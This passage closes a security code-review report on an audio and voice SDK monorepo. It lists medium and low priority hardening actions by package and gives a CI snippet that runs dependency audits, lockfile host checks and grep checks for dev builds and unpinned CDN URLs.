### Ongoing (Medium/Low — within 30 days)

| # | Action | Packages |
|---|--------|----------|
| 12 | Add max buffer size to AudioBufferManager | stt |
| 13 | Revoke Blob URLs immediately after worklet registration | room |
| 14 | Add crossOriginIsolated guard for multi-threaded WASM | stt |
| 15 | Add voice embedding file validation | agentic-sdk-v2 |
| 16 | Disconnect destinationNode in VAD cleanup | vad |
| 17 | Quantize timing data before emission | stt |
| 18 | Add model cache cleanup API | stt |
| 19 | Document fingerprinting vectors in privacy section of SDK docs | room |
| 20 | Add screen capture detection as security signal | room |

---

## CI/CD Integration Recommendations

```yaml
# Add to CI pipeline
security-scan:
  script:
    - pnpm audit --audit-level=high
    - npx lockfile-lint --path pnpm-lock.yaml --type plain --allowed-hosts npm registry.npmjs.org
    # Verify no dev/nightly builds in production dependencies
    - |
      if grep -r 'dev\.' packages/*/package.json | grep -v devDependencies; then
        echo "ERROR: Dev/nightly dependencies found in production"
        exit 1
      fi
    # Verify CDN URLs are version-pinned
    - |
      if grep -rn 'cdn.jsdelivr.net/npm/' packages/*/src/ | grep -v '@[0-9]'; then
        echo "ERROR: Unpinned CDN URLs detected"
        exit 1
      fi
```

---

*Report generated by deep manual code review. All findings verified against source code in the repository.*
